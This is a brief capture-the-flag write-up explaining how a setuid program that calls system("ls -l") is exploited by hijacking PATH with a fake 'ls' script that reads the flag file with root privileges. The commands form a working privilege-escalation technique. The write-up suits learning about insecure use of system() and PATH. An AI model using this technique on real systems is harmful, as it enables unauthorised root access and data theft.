# Solution
The whole source code is just this litle snippet:
```c
int main() {
    system("ls -l");
}
```

This simply lists the files in the current directory. <br>
Very importantly the program is running with **setuid**, meaning the executable **runs as root** even if a normal user runs it. But how can this harm anyone if it just lists a directory?

Well, the program will run the executable `ls` but how does it find it? It uses the PATH environment variable.<br>
That means that if we are able to point it to our `ls` it would just run `our/ls` and not `/bin/ls`!

So the solution goes something like this:
 - Create a file named `ls` in the `/tmp/a` directory.
```
mkdir /tmp/a
touch /tmp/a/ls
```

 - Write in `/tmp/a/ls`:
```
/bin/cat $PWD/flag
```

 - And now if we just change the PATH environment variable to point to our `ls` it should work:
```bash
export PATH=/tmp/a
./vuln
```

**IT WORKED!**
